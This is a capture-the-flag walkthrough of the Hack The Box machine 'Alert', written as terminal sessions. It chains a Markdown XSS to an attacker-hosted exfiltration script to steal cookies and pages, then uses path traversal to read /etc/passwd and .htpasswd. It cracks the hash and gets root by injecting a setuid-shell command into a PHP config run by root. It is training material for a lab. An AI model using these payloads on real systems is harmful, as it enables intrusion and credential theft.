# Target
| Category       | Details                                            |
|----------------|----------------------------------------------------|
| 📝 Name        | [Alert](https://app.hackthebox.com/machines/Alert) |
| 🏷 Type        | HTB Machine                                        |
| 🖥️ OS          | Linux                                              |
| 🎯 Difficulty  | Easy                                               |

# Init
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ echo "$TARGET_IP alert.htb" | sudo tee -a /etc/hosts
10.129.231.188 alert.htb
```

# Scan
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ nmap -sS -sV -sC alert.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 07:33 CET
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.059s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 7e:46:2c:46:6e:e6:d1:eb:2d:9d:34:25:e6:36:14:a7 (RSA)
|   256 45:7b:20:95:ec:17:c5:b4:d8:86:50:81:e0:8c:e8:b8 (ECDSA)
|_  256 cb:92:ad:6b:fc:c8:8e:5e:9f:8c:a2:69:1b:6d:d0:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.14 seconds
```

# Foothold
We can see two (remote) services running on target machine. Let's start browsing web page and run `ffuf` in the background.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://alert.htb/FUZZ -H "User-Agent: curl/8.11.1" -e .php

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Header           : User-Agent: curl/8.11.1
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

uploads                 [Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 24ms]
index.php               [Status: 302, Size: 660, Words: 123, Lines: 24, Duration: 2789ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 30ms]
contact.php             [Status: 200, Size: 24, Words: 3, Lines: 2, Duration: 3836ms]
messages                [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 25ms]
messages.php            [Status: 200, Size: 1, Words: 1, Lines: 2, Duration: 26ms]
visualizer.php          [Status: 200, Size: 633, Words: 181, Lines: 26, Duration: 28ms]
```

With little bit of browsing we can see that this web application is some kind of Markdown viewer, with following functionality:
* Upload Markdown file - http://alert.htb/visualizer.php
* View parsed Markdown file - http://alert.htb/visualizer.php?link_share=$MARKDOWN_FILE_ID.md
* Send message (probably to admin) - http://alert.htb/index.php?page=contact
* Get some details about service - http://alert.htb/index.php?page=about
* Make donation - http://alert.htb/index.php?page=donate

Additionally to that `ffuf` have found `messages.php` which returns blank page.

As application seems not to be vulnerable to LFI using `page` parameter, for the time being, Markdown upload form seems to be the most straightforward choice for exploitation. We will try to:
* Upload `.php` file. - Got `Error: File must be a Markdown file (.md).`
* Upload `.md` file with PHP code. - Code has been parsed as part of Markdown.
* Upload `.md` file with JS code. - `<script>alert('XSS')</script>`, triggers alert dialog box!

With this simple JS code we have just proved that Markdown parser / renderer is vulnerable to XSS. Now we need to find a way to exploit this vulnerability. In real life scenario we would need to make other user (e.g. admin) view this exploited Markdown so our injected JavaScript code will be executed. In this particular case we can see that each uploaded Markdown 'render' could be shared via direct URL (http://alert.htb/visualizer.php?link_share=$MARKDOWN_FILE_ID.md) we could use that and send this URL in contact form with hope that web application owener will open it.

Let's start with simple probing. On our C2 server we will host `exfil.php` script which will help us exfiltrate data with XSS.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ cat <<EOF> /var/www/html/exfil.php
<?php
$data = isset($_GET['data']) ? $_GET['data'] : (isset($_POST['data']) ? $_POST['data'] : 'No data');
$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date("Y-m-d H:i:s");
$logFile = "exfil.log";
$logEntry = "[$timestamp] IP: [$ip] | User-Agent: [$userAgent] | Data: [$data]\n";
file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
exit();
?>
EOF
```

Our probe will be a single XSS line `.md` file, which will fetch `exfil.php` from our C2, we will upload it and send it's URL using `contact.php`. If Markdown render URL will be opened we should see entry in our `exfil.log`
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ XSS="<script src='http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/exfil.php'></script>" && \
URL=$(curl -X POST http://alert.htb/visualizer.php -s -F "file=@-;filename=xss.md" <<< $XSS | grep Share | grep -oP 'href="\K[^"]+') && \
curl -X POST http://alert.htb/contact.php -d "email=john.doe@server.com&message=$URL" && \
sleep 1 && \
tail -n 1 /var/www/html/exfil.log

[2025-03-22 06:35:46] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [No data]
```

As we can see, immediately after sending message with contact form, we got connection from user reading that message. Now this immediate response is due to (most probably) some kind of automated script which simply opens our URL, `HeadlessChrome` user agent in out log could prove this. This is done for sake of HTB challenge 'playability', in real life scenario this would of course require more time. Anyway, we let's proceed along this path and see if we could steal some cookies.

```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ XSS="<script src='http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/exfil.php?data='+document.cookie></script>" && \
URL=$(curl -X POST http://alert.htb/visualizer.php -s -F "file=@-;filename=xss.md" <<< $XSS | grep Share | grep -oP 'href="\K[^"]+') && \
curl -X POST http://alert.htb/contact.php -d "email=john.doe@server.com&message=$URL" && \
sleep 1 && \
tail -n 1 /var/www/html/exfil.log

[2025-03-22 06:38:17] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: []
```

We can see in logs that `$_GET['data']` was set but it was empty, meaning there are no cookies to be stolen or they are marked as `HttpOnly`. What we could try next is to chain XSS with CSRF, this would be GET-based CSRF as there not much of known POST endpoints (other than Markdown upload). We will use this chain to browse web application being 'impersonated' as contact message reader. As injected JS is getting complicated we will externalize into dedicated script and host in on C2. We will use PHP script so we could easily pass path to browse as parameter.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ cat <<EOF> /var/www/html/browse.php
<?php
header("Content-Type: application/javascript");
\$path = isset(\$_GET['path']) ? \$_GET['path'] : "/";
echo <<<JS
fetch("http://alert.htb\$path")
  .then(response => response.text())
  .then(data => fetch("http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/exfil.php?data=" + encodeURIComponent(data)));
JS;
?>
EOF
```

Additionally as we might like to execute our 'browser' multiple times, it will be more handy to alias our XSS exploit.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse() { curl -X POST http://alert.htb/contact.php -d "email=john.doe@server.com&message=$(curl -X POST http://alert.htb/visualizer.php -s -F "file=@-;filename=xss.md" <<< "<script src='http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/browse.php?path=$1'></script>" | grep Share | grep -oP 'href="\K[^"]+')" }; alias xss_browse='xss_browse'
```

With everything in place let's start 'remote browsing'. One remark, as in this case inbound `data` for our `exfil.php` will consist of multiple lines, thus we will run `tail -f /var/www/html/exfil.log` in dedicated terminal (`tmux` FTW!).
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse /index.php?page=about
```
```
┌──(magicrc㉿perun)-[/var/www/html]
└─$ tail -f /var/www/html/exfil.log
[2025-03-22 06:44:07] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="css/style.css">
    <title>Alert - Markdown Viewer</title>
</head>
<body>
    <nav>
        <a href="index.php?page=alert">Markdown Viewer</a>
        <a href="index.php?page=contact">Contact Us</a>
        <a href="index.php?page=about">About Us</a>
        <a href="index.php?page=donate">Donate</a>
        <a href="index.php?page=messages">Messages</a>    </nav>
    <div class="container">
        <h1>About Us</h1><p>Hello! We are Alert. Our service gives you the ability to view MarkDown. We are reliable, secure, fast and easy to use. If you experience any problems with our service, please let us know. Our administrator is in charge of reviewing contact messages and reporting errors to us, so we strive to resolve all issues within 24 hours. Thank you for using our service!</p>    </div>
    <footer>
        <p style="color: black;">© 2024 Alert. All rights reserved.</p>
    </footer>
</body>
</html>]
```

Our browser seems to be operational. At first glance content we are getting is same as for regular browser, there is however one file which might be interesting, `messages.php`. For regular browser empty response was returned, let's check XSS - CSRF chain approach.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse /messages.php
```
```
[2025-03-22 06:48:23] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<h1>Messages</h1><ul><li><a href='messages.php?file=2024-03-10_15-48-34.txt'>2024-03-10_15-48-34.txt</a></li></ul>]
```

We've got **not** empty response and from it's content we can see that `messages.php` accepts `file` GET parameter. Let's follow href from reponse.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse /messages.php?file=2024-03-10_15-48-34.txt
```
```
[2025-03-22 06:49:04] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre></pre>]
```

Looks that `2024-03-10_15-48-34.txt` might be empty (or non-existing), let's check if we could traverse directories.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse /messages.php?file=../messages.php
```
```
[2025-03-22 06:49:37] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre><?php
$ip = $_SERVER['REMOTE_ADDR'];
if ($ip == '127.0.0.1' || $ip == '::1') {
    $directory = "messages/";

    $messages = glob($directory . "*.txt");

    if (isset($_GET['file'])) {
        $file = $_GET['file'];
        echo "<pre>" . file_get_contents($directory . $file) . "</pre>";
    } else {
        echo "<h1>Messages</h1>";
        if (count($messages) > 0) {
            echo "<ul>";
            foreach ($messages as $message) {
                $filename = basename($message);
                echo "<li><a href='messages.php?file=$filename'>$filename</a></li>";
            }
            echo "</ul>";
        } else {
            echo "No messages found.";
        }
    }
}
?>

</pre>]
```

With this PHP code (of `messages.php`) in output have discovered yet another vulnerability. This time it's LFI in locally available `messages.php` in `file` parameter. This vulnerability will not lead to RCE, but still could be handy. Let's add it to our already exising chain of exploits and use it browse local files. But first let's check how far we need to traverse to reach `/`, we will use good old `/etc/passwd` for probing. After couple of tries we got:
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ xss_browse /messages.php?file=../../../../etc/passwd
```
```
[2025-03-22 06:50:28] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
albert:x:1000:1000:albert:/home/albert:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
david:x:1001:1002:,,,:/home/david:/bin/bash
</pre>]
```

First thing is that we have discovered that we need `../../../..` to reach `/`, we will use this in a moment in new version of our XSS alias. Second thing is that we have found that there are two potentailly ineresting users `albert` `id(1000)` and `david` `id(1001)`. Let's upgrade our alias to XSS/Get-CSRF/LFI chain and name it `rcat` ('remote cat').

```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ rcat() { curl -X POST http://alert.htb/contact.php -d "email=john.doe@server.com&message=$(curl -X POST http://alert.htb/visualizer.php -s -F "file=@-;filename=xss.md" <<< "<script src='http://$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)/browse.php?path=/messages.php?file=../../../..$1'></script>" | grep Share | grep -oP 'href="\K[^"]+')" }; alias rcat='rcat'
```

With `rcat` in place let start browsing files. We do not hava ability to `ls` directories, so we must know beforehand what we are looking for. Let's check `/etc/hosts`.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ rcat /etc/hosts
```
```
[2025-03-22 06:51:58] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre>127.0.0.1 localhost
127.0.1.1 alert
127.0.0.1 alert.htb
127.0.0.1 statistics.alert.htb

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
</pre>]
```

It seems that there might be additional virtual host (`statistics.alert.htb`) running on the target. Let's investigate it by first adding it to `/etc/hosts` on our attacking machine and then simply browse it (`http://statistics.alert.htb`).
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ echo "$TARGET_IP statistics.alert.htb" | sudo tee -a /etc/hosts
10.129.231.188 statistics.alert.htb
```

After entering this web page we immediately got basic authentication form. As we have access to local files with permission of web server user (most probably `www-data`) we could try to locate `.htpasswd` file for this site. Previous enumeration showed that Apache HTTP server is used, so we will try our luck with some default configuration files locations.

```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ rcat /etc/apache2/apache2.conf 
```

It seems that (default) server configuration is not accessible. Let's try default file location for enabled sites.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ rcat /etc/apache2/sites-enabled/000-default.conf
```
```
[2025-03-22 06:53:12] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre><VirtualHost *:80>
    ServerName alert.htb

    DocumentRoot /var/www/alert.htb

    <Directory /var/www/alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    RewriteEngine On
    RewriteCond %{HTTP_HOST} !^alert\.htb$
    RewriteCond %{HTTP_HOST} !^$
    RewriteRule ^/?(.*)$ http://alert.htb/$1 [R=301,L]

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

<VirtualHost *:80>
    ServerName statistics.alert.htb

    DocumentRoot /var/www/statistics.alert.htb

    <Directory /var/www/statistics.alert.htb>
        Options FollowSymLinks MultiViews
        AllowOverride All
    </Directory>

    <Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>

</pre>]
```

We have successfully accessed it and what is more we can see that `/var/www/statistics.alert.htb/.htpasswd` is being used as `AuthUserFile` for `statistics.alert.htb` vhost. Let's grab it.

```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ rcat /var/www/statistics.alert.htb/.htpasswd
```
```
[2025-03-22 06:53:41] IP: [10.129.231.188] | User-Agent: [Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/122.0.6261.111 Safari/537.36] | Data: [<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>]
```

We can see that it contains MD5 (apr1) hashed password for user `albert`, which we already know also exists in on the target system. Let's use `hashcat` to conduct dictionary attack.
```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ hashcat -m 1600 -a 0 --username --quiet 'albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' /usr/share/wordlists/rockyou.txt
$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:****************
```

We have our first credentials! We could use it to pass basic HTTP authentication for `http://statistics.alert.htb`, however before that let's quickly check (with use of SSH) if user `albert` is reusing this password to access target system.

```
┌──(magicrc㉿perun)-[~/attack/HTB Alert]
└─$ ssh albert@alert.htb
albert@alert.htb's password:
albert@alert:~$
```

It seems he does! We have just gained our foothold, let's grab user flag and elevate privilages.
```
albert@alert:~$ cat /home/albert/user.txt 
********************************
```

# Privilages escalation
After running standard checks we can see that there is additional service running on loopback interface.
```
albert@alert:~$ netstat -natup
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:41772         127.0.0.1:80            TIME_WAIT   -                   
tcp        0      0 127.0.0.1:41788         127.0.0.1:80            TIME_WAIT   -                   
tcp        0    360 10.129.231.188:22       10.10.14.212:51478      ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 10.129.231.188:54132    1.1.1.1:53              ESTABLISHED -                   
udp        0      0 10.129.231.188:56443    8.8.8.8:53              ESTABLISHED -                   
udp        0      0 127.0.0.1:56462         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
```

With additional process list query
```
albert@alert:~$ ps aux | grep 8080
root         954  0.0  0.6 206768 24372 ?        Ss   06:31   0:00 /usr/bin/php -S 127.0.0.1:8080 -t /opt/website-monitor
```
                                                                                                                             
We can see that this another PHP application, located in `/opt/website-monitor` this time run by `root`. Let's go down this path, but instead of immediate port fowarding to access this server with our web browser, let's try to browse it's files locally.
```
albert@alert:~$ ls -l /opt/website-monitor/
total 84
drwxrwxr-x 2 root management  4096 Oct 12 04:17 config
drwxrwxr-x 2 root root        4096 Oct 12 00:58 incidents
-rwxrwxr-x 1 root root        5323 Oct 12 01:00 index.php
-rwxrwxr-x 1 root root        1068 Oct 12 00:58 LICENSE
-rwxrwxr-x 1 root root        1452 Oct 12 01:00 monitor.php
drwxrwxrwx 2 root root        4096 Oct 12 01:07 monitors
-rwxrwxr-x 1 root root         104 Oct 12 01:07 monitors.json
-rwxrwxr-x 1 root root       40849 Oct 12 00:58 Parsedown.php
-rwxrwxr-x 1 root root        1657 Oct 12 00:58 README.md
-rwxrwxr-x 1 root root        1918 Oct 12 00:58 style.css
drwxrwxr-x 2 root root        4096 Oct 12 00:58 updates
```

We have full read access to this application, thus we can analyze it's source code and look for potential vulnarabilities. Looking at the `monitor.php` we can see that it is being used to check HTTP responses of URLs configured in `monitors.json` file and store results of those checks in corresponding files in `monitors` directory. With use of `watch -n 1 ls -l --full-time /opt/website-monitor/monitors` and little bit of waiting (~1 minute), we can see that `monitors` files (`alert.htb` and `statistics.alert.htb`) are being updated every 1 minute, thus we could assume that `monitor.php` script is being executed every 1 minute. What is really intersing for us it that:
```
albert@alert:~$ ls -la /opt/website-monitor/monitors
total 24
drwxrwxrwx 2 root root 4096 Oct 12 01:07 .
drwxrwxr-x 7 root root 4096 Oct 12 01:07 ..
-rw-r--r-x 1 root root 5580 Mar 22 06:57 alert.htb
-rw-r--r-x 1 root root 5577 Mar 22 06:57 statistics.alert.htb
```
Only `root` can write to `monitors` files (`alert.htb` and `statistics.alert.htb`), meaning `monitor.php` is run as `root`.
```
albert@alert:~$ cat -n /opt/website-monitor/monitor.php
```
```
<SNIP>
    17  include('config/configuration.php');
<SNIP>    
```
Additionally `monitor.php` includes `config/configuration.php` which our current user can modify as he belongs to `management` group.

```
albert@alert:~$ ls -la /opt/website-monitor/config/
total 12
drwxrwxr-x 2 root management 4096 Oct 12 04:17 .
drwxrwxr-x 7 root root       4096 Oct 12 01:07 ..
-rwxrwxr-x 1 root management   49 Nov  5 14:31 configuration.php
```

What is left is bascially adding some root shell spawing code to `configuration.php`. The file itself contains single definition (for `PATH` constant).
```
cat /opt/website-monitor/config/configuration.php
```
```
<?php
define('PATH', '/opt/website-monitor');
?>
```

Knowing all that let's write one last exploit for this challenge.
```
albert@alert:~$ echo "<?php system('cp /bin/bash /tmp/root_shell && chmod a+s /tmp/root_shell'); define('PATH', '/opt/website-monitor');?>" > /opt/website-monitor/config/configuration.php && \
> sleep 5 && \
> /tmp/root_shell -p
root_shell-5.0# whoami
root
```

Privilages escalated! Let's grab root flag and logout.
```
root_shell-5.0# cat /root/root.txt 
********************************
```